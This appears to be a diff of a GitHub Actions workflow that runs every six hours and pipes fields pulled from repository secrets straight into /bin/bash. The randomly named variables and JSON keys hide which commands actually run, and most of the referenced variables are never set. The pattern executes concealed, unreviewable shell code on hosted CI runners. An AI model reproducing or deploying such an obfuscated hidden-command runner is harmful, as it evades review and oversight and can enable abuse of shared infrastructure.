@@ -3,31 +3,24 @@ name: yangxiong19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 1/6 * * *'
+    - cron: '59 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yangxiong19871010
         env:
-          q007: ${{ secrets.q007 }}
+          cdu848: ${{ secrets.cdu848 }}
         run: |
-          echo $q007 | jq -r .yyld37134 | /bin/bash
-          echo $brt56196 | jq -r .kmd103 | /bin/bash
-          echo $zl87 | jq -r .grbc6 | /bin/bash
-          echo $m5 | jq -r .vlun822 | /bin/bash
-          echo $nhp656 | jq -r .qht352 | /bin/bash
-          echo $zgqle70300 | jq -r .t638 | /bin/bash
-          echo $hptxx8850 | jq -r .f85775 | /bin/bash
-          echo $noa5 | jq -r .jpm556 | /bin/bash
-          echo $nyt2 | jq -r .yrakj87918 | /bin/bash
-          echo $ird19945 | jq -r .w170 | /bin/bash
-          echo $rl9 | jq -r .nw8 | /bin/bash
-          echo $ps7355 | jq -r .tnezd1 | /bin/bash
-          echo $vf26989 | jq -r .i1594 | /bin/bash
-          echo $hf2 | jq -r .i1 | /bin/bash
-          echo $dwwmf1919 | jq -r .i17 | /bin/bash
-          echo $jgy410 | jq -r .kgnr02 | /bin/bash
+          echo $cdu848 | jq -r .eyuiu862 | /bin/bash
+          echo $hg736 | jq -r .klka0803 | /bin/bash
+          echo $wv39729 | jq -r .iam6263 | /bin/bash
+          echo $vpt873 | jq -r .qdq24486 | /bin/bash
+          echo $aky6717 | jq -r .ffd57 | /bin/bash
+          echo $ceu9439 | jq -r .lj90 | /bin/bash
+          echo $gs87882 | jq -r .rlacg28705 | /bin/bash
+          echo $gh44967 | jq -r .muk44329 | /bin/bash
 
